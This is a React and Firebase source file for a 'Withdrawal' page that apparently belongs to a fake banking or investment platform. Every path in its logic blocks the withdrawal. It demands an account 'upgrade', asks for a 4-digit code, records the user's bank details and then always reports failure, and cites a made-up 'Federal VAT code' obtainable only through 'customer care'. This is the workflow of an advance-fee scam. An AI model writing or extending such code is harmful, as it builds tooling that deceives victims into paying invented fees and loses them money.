import React, { useState, useEffect } from 'react';
import { auth, db } from '../firebaseconfig';
import { doc, getDoc, addDoc, collection } from 'firebase/firestore';
import { Dialog } from '@headlessui/react';
import { FaUniversity, FaMoneyBillWave, FaDollarSign } from 'react-icons/fa';

const Bank = () => {
  const [userData, setUserData] = useState(null);
  const [accountNumber, setAccountNumber] = useState('');
  const [bankName, setBankName] = useState('');
  const [amount, setAmount] = useState('');
  const [showUpgradePopup, setShowUpgradePopup] = useState(false);
  const [showCodePopup, setShowCodePopup] = useState(false);
  const [showAdminPopup, setShowAdminPopup] = useState(false);
  const [code, setCode] = useState('');

  useEffect(() => {
    const fetchUserData = async () => {
      const user = auth.currentUser;
      if (user) {
        const userDoc = await getDoc(doc(db, 'users', user.uid));
        if (userDoc.exists()) {
          setUserData(userDoc.data());
        }
      }
    };

    fetchUserData();
  }, []);

  const handleWithdraw = () => {
    if (userData.accountLevel <= 1) {
      setShowUpgradePopup(true);
    } else if (parseFloat(amount) <= userData.accountBalance) {
      setShowCodePopup(true);
    } else {
      alert('Tranfer pending, kindly contact admin.');
    }
  };

  const handleCodeSubmit = async () => {
    const user = auth.currentUser;
    if (user) {
      await addDoc(collection(db, 'withdrawals'), {
        uid: user.uid,
        accountNumber,
        bankName,
        amount: parseFloat(amount),
        timestamp: new Date(),
      });
      setShowCodePopup(false);
      alert('Withdrawal failed, file dispute.');
    }
  };

  const handleSetCode = () => {
    setShowAdminPopup(true);
  };

  return (
    <div className="min-h-screen p-6 bg-gray-100 flex flex-col items-center">
      <div className="flex mb-6">
        <h2 className="text-2xl font-bold">Withdrawal</h2>
      </div>
      <div className="bg-white p-6 rounded-lg shadow-lg w-full max-w-md">
        <div className="mb-4">
          <FaUniversity className="inline mr-2 text-gray-700" />
          <input
            type="number"
            placeholder="Account Number"
            value={accountNumber}
            onChange={(e) => setAccountNumber(e.target.value)}
            className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
          />
        </div>
        <div className="mb-4">
          <FaMoneyBillWave className="inline mr-2 text-gray-700" />
          <input
            type="text"
            placeholder="Bank Name"
            value={bankName}
            onChange={(e) => setBankName(e.target.value)}
            className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
          />
        </div>
        <div className="mb-4">
          <FaDollarSign className="inline mr-2 text-gray-700" />
          <input
            type="number"
            placeholder="Amount"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
          />
        </div>
        <button
          onClick={handleWithdraw}
          className="bg-green-500 text-white py-2 px-4 rounded-lg w-full"
        >
          Withdraw
        </button>
      </div>

      {/* Upgrade to Level 2 Popup */}
      <Dialog open={showUpgradePopup} onClose={() => setShowUpgradePopup(false)}>
        <div className="fixed inset-0 bg-black bg-opacity-30 flex items-center justify-center">
          <div className="bg-white p-6 rounded-lg shadow-lg">
            <Dialog.Title className="text-lg font-bold">Upgrade Required</Dialog.Title>
            <div className="mt-4">
              <p>Your account level is too low for this transaction. Please upgrade to level 2.</p>
              <button
                onClick={() => setShowUpgradePopup(false)}
                className="mt-4 bg-blue-500 text-white py-2 px-4 rounded-lg"
              >
                OK
              </button>
            </div>
          </div>
        </div>
      </Dialog>

      {/* Enter 4-Digit Code Popup */}
      <Dialog open={showCodePopup} onClose={() => setShowCodePopup(false)}>
        <div className="fixed inset-0 bg-black bg-opacity-30 flex items-center justify-center">
          <div className="bg-white p-6 rounded-lg shadow-lg">
            <Dialog.Title className="text-lg font-bold">Enter 4-Digit Code</Dialog.Title>
            <div className="mt-4">
              <input
                type="text"
                placeholder="Enter 4-Digit Code"
                value={code}
                onChange={(e) => setCode(e.target.value)}
                className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
              />
              <button
                onClick={handleCodeSubmit}
                className="mt-4 bg-green-500 text-white py-2 px-4 rounded-lg mr-3"
              >
                Submit
              </button>
              <button
                onClick={handleSetCode}
                className="mt-4 bg-blue-500 text-white py-2 px-4 rounded-lg"
              >
                Set Code
              </button>
            </div>
          </div>
        </div>
      </Dialog>

      {/* Contact Admin Popup */}
      <Dialog open={showAdminPopup} onClose={() => setShowAdminPopup(false)}>
        <div className="fixed inset-0 bg-black bg-opacity-30 flex items-center justify-center">
          <div className="bg-white p-6 rounded-lg shadow-lg">
            <Dialog.Title className="text-lg font-bold">Contact Admin</Dialog.Title>
            <div className="mt-4">
              <p>The Federal VAT code is required before this transaction can be
              completed successfully. You can contact our online customer care
              representative for more details about the VAT code for this
              transaction.</p>
              <button
                onClick={() => setShowAdminPopup(false)}
                className="mt-4 bg-blue-500 text-white py-2 px-4 rounded-lg"
              >
                OK
              </button>
            </div>
          </div>
        </div>
      </Dialog>
    </div>
  );
};

export default Bank;
